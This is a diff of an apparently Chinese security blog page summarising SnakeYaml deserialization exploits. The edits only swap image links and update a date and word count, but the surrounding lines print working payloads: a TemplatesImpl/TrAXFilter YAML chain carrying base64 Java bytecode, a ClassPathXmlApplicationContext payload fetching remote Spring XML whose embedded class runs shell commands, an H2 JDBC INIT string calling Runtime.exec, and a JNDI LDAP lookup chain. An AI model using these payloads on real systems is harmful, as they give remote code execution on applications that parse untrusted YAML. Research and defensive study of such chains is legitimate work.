@@ -272,7 +272,7 @@
             
                 <span class="meta-info-item post-update-date">
                     <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                    <span class="datetime" data-updated="Mon Aug 04 2025 16:06:33 GMT+0800">2025-08-04 16:06:33</span>
+                    <span class="datetime" data-updated="Tue Oct 21 2025 20:58:19 GMT+0800">2025-10-21 20:58:19</span>
                 </span>
             
         
@@ -335,9 +335,9 @@
 <h3 id="简要分析"><a href="#简要分析" class="headerlink" title="简要分析"></a>简要分析</h3><p>1、sink</p>
 <p>在CC链中，有一个TrAXFilter类，它的构造方法能够触发newTransformer，从而通过TemplatesImpl触发字节码加载。TemplatesImpl里有几个关键的字段需要赋值，分别是：_bytecodes，_tfactory，_name 。现在让我们看看能不能通过构造方法来为这几个赋值，如果能的话，很可能就能使用SnakeYaml进行反序列化。</p>
 <p>有两个protected构造方法：</p>
-<p><img   src="/2025/05/03/JNI/eYaml%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-1754209745014.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/image-1754209745014.png"  alt="img"></p>
 <p>上面那个跟进init：</p>
-<p><img   src="/2025/05/03/JNI/eYaml%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-1754209745027.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/image-1754209745027.png"  alt="img"></p>
 <p>非常巧，我们需要的几个字段都能在构造方法中赋值。</p>
 <p>2、byte[][]如何写入.yml</p>
 <p>byte[] 对应 !!binary xxxxx，但是byte[][]应该怎么写？</p>
@@ -348,20 +348,20 @@
 <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span> [</span><br><span class="line">  [<span class="type">!!binary</span> <span class="string">SGVsbG8=</span>],</span><br><span class="line">  <span class="string">&quot;heihu577&quot;</span>,</span><br><span class="line">  <span class="type">!!java.util.Properties</span> &#123;&#125;,</span><br><span class="line">  <span class="type">!!int</span> <span class="number">0</span>,</span><br><span class="line">  <span class="type">!!com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span> &#123;&#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
 
 <p>但是却报错：</p>
-<p><img   src="/2025/05/03/JNI/eYaml%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-1754209754236.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/image-1754209754236.png"  alt="img"></p>
 <p>说是找不到合适的构造方法。</p>
 <p>我们跟进报错，去调试一下：</p>
-<p><img   src="/2025/05/03/JNI/eYaml%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-1754209754229.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/image-1754209754229.png"  alt="img"></p>
 <p>上面这张图，首先将参数数量一致的构造方法添加进List，然后进行判断。如果构造方法是唯一的，就会将yaml文件中读取到的数据，全部转换为符合构造函数参数的数据类型。</p>
 <p>下面这张图，在构造方法大于1个时进入。我们目前就属于这种情况。问题出现在isAssignbleFrom。</p>
-<p><img   src="/2025/05/03/JNI/eYaml%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-1754209763939.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/image-1754209763939.png"  alt="img"></p>
 <p>虽然我们传入的是一个bytes[][]，但是解析后变成了ArrayList，而byte[][]和ArrayList是不满足if的，也就是byte[][] &#x3D; new ArrayList()是不成立的，如下图。所以在这儿会抛出错误。</p>
-<p><img   src="/2025/05/03/JNI/eYaml%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-1754209763894.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/image-1754209763894.png"  alt="img"></p>
 <p>4、解决报错</p>
 <p>由于TemplatesImpl是硬编码，不能修改的。所以我们只能想办法让传入的byte[][]先从ArrayList转换成byte[][]，再进入if。</p>
 <p>这里运用的方法是先创建引用类型，而后引用。</p>
 <p>这里作者找到了这样一个类 com.sun.javafx.iio.ImageFrame 这个类有两个不同参数的构造方法，且构造方法中有byte[][]类型的参数：</p>
-<p><img   src="/2025/05/03/JNI/eYaml%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/attach-ee7cb18e1bd2991de46ddf6e8ee73d151f6ed6ce.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/attach-ee7cb18e1bd2991de46ddf6e8ee73d151f6ed6ce.png"  alt="img"></p>
 <p>最终payload：</p>
 <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  <span class="type">!!com.sun.javafx.iio.ImageFrame</span> [<span class="literal">null</span>, <span class="literal">null</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="string">&amp;A</span> [<span class="type">!!binary</span> <span class="string">&quot;yv66vgAAADQAXwoAEgA0BwA1CgACADQHADYKADcAOAoAOQA6CgACADsJADwAPQcAPgoACQA/CgBAAEEKAEIAQwgARAoAQgBFBwBGBwBHCgAQAEgHAEkBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAGExjb20vaGVpaHU1NzcvYmVhbi9FdmlsOwEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAZlbmNvZGUBAAJbQgEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwBKAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAg8Y2xpbml0PgEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwBGAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQwAEwAUAQAqb3JnL2FwYWNoZS90b21jYXQvdXRpbC9jb2RlYy9iaW5hcnkvQmFzZTY0AQAWY29tL2hlaWh1NTc3L2JlYW4vRXZpbAcASwwATABNBwBODABPAFAMAB4AUQcAUgwAUwBUAQAQamF2YS9sYW5nL1N0cmluZwwAEwBVBwBWDABXAFgHAFkMAFoAWwEABGNhbGMMAFwAXQEAE2phdmEvaW8vSU9FeGNlcHRpb24BABpqYXZhL2xhbmcvUnVudGltZUV4Y2VwdGlvbgwAEwBeAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAK2NvbS9zdW4vb3JnL2FwYWNoZS9iY2VsL2ludGVybmFsL1JlcG9zaXRvcnkBAAtsb29rdXBDbGFzcwEASShMamF2YS9sYW5nL0NsYXNzOylMY29tL3N1bi9vcmcvYXBhY2hlL2JjZWwvaW50ZXJuYWwvY2xhc3NmaWxlL0phdmFDbGFzczsBADRjb20vc3VuL29yZy9hcGFjaGUvYmNlbC9pbnRlcm5hbC9jbGFzc2ZpbGUvSmF2YUNsYXNzAQAIZ2V0Qnl0ZXMBAAQoKVtCAQAGKFtCKVtCAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEABShbQilWAQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWACEABAASAAAAAAAFAAEAEwAUAAEAFQAAAC8AAQABAAAABSq3AAGxAAAAAgAWAAAABgABAAAADgAXAAAADAABAAAABQAYABkAAAAJABoAGwABABUAAABeAAQAAgAAACK7AAJZtwADEgS4AAW2AAa2AAdMsgAIuwAJWSu3AAq2AAuxAAAAAgAWAAAADgADAAAAEAATABEAIQASABcAAAAWAAIAAAAiABwAHQAAABMADwAeAB8AAQABACAAIQACABUAAAA/AAAAAwAAAAGxAAAAAgAWAAAABgABAAAAHwAXAAAAIAADAAAAAQAYABkAAAAAAAEAIgAjAAEAAAABACQAJQACACYAAAAEAAEAJwABACAAKAACABUAAABJAAAABAAAAAGxAAAAAgAWAAAABgABAAAAJAAXAAAAKgAEAAAAAQAYABkAAAAAAAEAIgAjAAEAAAABACkAKgACAAAAAQArACwAAwAmAAAABAABACcACAAtABQAAQAVAAAAZgADAAEAAAAXuAAMEg22AA5XpwANS7sAEFkqtwARv7EAAQAAAAkADAAPAAMAFgAAABYABQAAABYACQAZAAwAFwANABgAFgAaABcAAAAMAAEADQAJAC4ALwAAADAAAAAHAAJMBwAxCQABADIAAAACADM=&quot;</span>], <span class="literal">null</span>],</span><br><span class="line">  <span class="type">!!com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</span> [</span><br><span class="line">    <span class="type">!!com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span> [<span class="string">*A</span>,<span class="string">&quot;heihu577&quot;</span>,<span class="type">!!java.util.Properties</span> &#123;&#125;,<span class="type">!!int</span> <span class="number">0</span>,<span class="type">!!com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span> &#123;&#125;]</span><br><span class="line">  ]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
 
@@ -382,9 +382,9 @@
 
 <h3 id="简要分析-1"><a href="#简要分析-1" class="headerlink" title="简要分析"></a>简要分析</h3><p>具体的构造方法自己看一下。这里主要讲在哪里触发文件写入的。</p>
 <p>Marshal的构造方法，这里面out是InflaterOutputStream：</p>
-<p><img   src="/2025/05/03/JNI/eYaml%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-1754236249048.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/image-1754236249048.png"  alt="img"></p>
 <p>下面是完整调用过程</p>
-<p><img   src="/2025/05/03/JNI/eYaml%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-1754236260704.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/image-1754236260704.png"  alt="img"></p>
 <h3 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h3><p>1、java.io.ObjectOutputStream#ObjectOutputStream(java.io.OutputStream)能触发out.write，有可能可以写文件</p>
 <h2 id="Marshal-ClassPathXmlApplicationContext"><a href="#Marshal-ClassPathXmlApplicationContext" class="headerlink" title="Marshal+ClassPathXmlApplicationContext"></a>Marshal+ClassPathXmlApplicationContext</h2><p>jdk8只支持spring-boot-starter-web 2.xx版本，3版本必须用jdk17</p>
 <h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>先通过Marsal写xml：</p>
@@ -394,12 +394,12 @@
 <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!org.springframework.context.support.ClassPathXmlApplicationContext</span> [ <span class="string">&quot;http://example.com/spring.xml&quot;</span> ]</span><br></pre></td></tr></table></figure>
 
 <p>xml格式：可以用java-chains生成</p>
-<p><img   src="/2025/05/03/JNI/eYaml%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-1754273304910.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/image-1754273304910.png"  alt="img"></p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">                           http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;decoder&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.beans.factory.config.MethodInvokingFactoryBean&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;staticMethod&quot;</span> <span class="attr">value</span>=<span class="string">&quot;javax.xml.bind.DatatypeConverter.parseBase64Binary&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;arguments&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>yv66vgAAADIAQAEAaW9yZy9hcGFjaGUvY29sbGVjdGlvbnMvY295b3RlL2pzb25Gb3JtYXRWaXNpdG9ycy9Kc29uSW50ZWdlckZvcm1hdFZpc2l0b3IyYTEzOGQ4MmU3MjQ0OWMzYTU3Y2NjMzYzYTMyMTcwYgcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAARiYXNlAQASTGphdmEvbGFuZy9TdHJpbmc7AQADc2VwAQADY21kAQAGPGluaXQ+AQADKClWAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcACwwACQAKCgAEAA0BAAdvcy5uYW1lCAAPAQAQamF2YS9sYW5nL1N5c3RlbQcAEQEAC2dldFByb3BlcnR5AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsMABMAFAoAEgAVAQAQamF2YS9sYW5nL1N0cmluZwcAFwEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsMABkAGgoAGAAbAQADd2luCAAdAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoMAB8AIAoAGAAhAQAHY21kLmV4ZQgAIwwABQAGCQACACUBAAIvYwgAJwwABwAGCQACACkBAAcvYmluL3NoCAArAQACLWMIAC0MAAgABgkAAgAvAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyBwAxAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgwACQAzCgAyADQBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwwANgA3CgAyADgBAAg8Y2xpbml0PgEABGNhbGMIADsKAAIADQEABENvZGUBAA1TdGFja01hcFRhYmxlACEAAgAEAAAAAwAJAAUABgAAAAkABwAGAAAACQAIAAYAAAACAAEACQAKAAEAPgAAAIQABAACAAAAUyq3AA4SELgAFrYAHBIetgAimQAQEiSzACYSKLMAKqcADRIsswAmEi6zACoGvQAYWQOyACZTWQSyACpTWQWyADBTTLsAMlkrtwA1tgA5V6cABEyxAAEABABOAFEADAABAD8AAAAXAAT/ACEAAQcAAgAACWUHAAz8AAAHAAQACAA6AAoAAQA+AAAAGgACAAAAAAAOEjyzADC7AAJZtwA9V7EAAAAAAAA=<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;classLoader&quot;</span> <span class="attr">class</span>=<span class="string">&quot;javax.management.loading.MLet&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;clazz&quot;</span> <span class="attr">factory-bean</span>=<span class="string">&quot;classLoader&quot;</span> <span class="attr">factory-method</span>=<span class="string">&quot;defineClass&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">ref</span>=<span class="string">&quot;decoder&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">type</span>=<span class="string">&quot;int&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">type</span>=<span class="string">&quot;int&quot;</span> <span class="attr">value</span>=<span class="string">&quot;914&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">factory-bean</span>=<span class="string">&quot;clazz&quot;</span> <span class="attr">factory-method</span>=<span class="string">&quot;newInstance&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <h3 id="简要分析-2"><a href="#简要分析-2" class="headerlink" title="简要分析"></a>简要分析</h3><p>这个也是两步，写文件，本地读文件，ClassXml那个类的构造方法为什么能触发可以自行学习一下。</p>
-<h2 id="H2"><a href="#H2" class="headerlink" title="H2"></a>H2</h2><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p><img   src="/2025/05/03/JNI/eYaml%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-1754273315656.png"  alt="img"></p>
-<p><img   src="/2025/05/03/JNI/eYaml%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-1754273316151.png"  alt="img"></p>
+<h2 id="H2"><a href="#H2" class="headerlink" title="H2"></a>H2</h2><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/image-1754273315656.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/image-1754273316151.png"  alt="img"></p>
 <p>2.1及以上版本只支持jdk17，且使用的是五个参数的构造函数，exp：</p>
 <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!org.h2.jdbc.JdbcConnection</span> [ <span class="string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;INIT=drop alias if exists exec\\;CREATE ALIAS EXEC AS $$void exec() throws java.io.IOException &#123; Runtime.getRuntime().exec(\&quot;calc.exe\&quot;)\\; &#125;$$\\;CALL EXEC ()\\;&quot;</span>, &#123;&#125;, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="literal">false</span> ]</span><br></pre></td></tr></table></figure>
 
@@ -446,7 +446,7 @@
 
 <p>这里是直接从远程加载.class文件，Reference的第二个参数是.class文件的类名，如果有包名前面要写包名。url最后的斜杠不能少。</p>
 <p>注意，这个最后走的是Codebase加载字节码，这个跟rmi一样，8u121就被禁了，实用性比较低。</p>
-<p><img   src="/2025/05/03/JNI/eYaml%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-1754294753958.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/image-1754294753958.png"  alt="img"></p>
 <h2 id="Commons-Configuration"><a href="#Commons-Configuration" class="headerlink" title="Commons-Configuration"></a>Commons-Configuration</h2><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">?</span> <span class="type">!!org.apache.commons.configuration.ConfigurationMap</span></span><br><span class="line"><span class="bullet">-</span> <span class="type">!!org.apache.commons.configuration.JNDIConfiguration</span></span><br><span class="line">   <span class="bullet">-</span> <span class="type">!!javax.naming.InitialContext</span> []</span><br><span class="line">   <span class="bullet">-</span> <span class="string">&quot;ldap://127.0.0.1:50389/8ebd8d&quot;</span></span><br><span class="line"><span class="string">:</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
 
 <p>多行时，不支持直接把一个复杂类作为键，需要用?表示键的开始。</p>
@@ -457,10 +457,10 @@
 <p>这里要求被探测的类有无参构造或者是一个接口，不然会因为没有合适的构造方法而报错。</p>
 <h1 id="小结-2"><a href="#小结-2" class="headerlink" title="小结"></a>小结</h1><p>SnakeYaml利用要关注构造方法，能通过构造方法触发的链子，都可以尝试迁移到SnakeYaml。</p>
 <p>同时也要关注字段为private或protected或static，且其setter只有一个参数的public setter方法。</p>
-<p><img   src="/2025/05/03/JNI/eYaml%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-1754294777978.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/image-1754294777978.png"  alt="img"></p>
 <p>这个public不能进，进去了就变成FieldProperty了，那到时候调用property.set时就不会调用invoke。</p>
 <p>setter不是public的话，会在这里抛出：</p>
-<p><img   src="/2025/05/03/JNI/eYaml%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-1754294777947.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/image-1754294777947.png"  alt="img"></p>
 
                     
                 </div>
@@ -637,7 +637,7 @@
             
                 <span class="count-item border-box word">
                     <span class="item-type border-box">总字数</span>
-                    <span class="item-value border-box word">71.7k</span>
+                    <span class="item-value border-box word">74.9k</span>
                 </span>
             
 
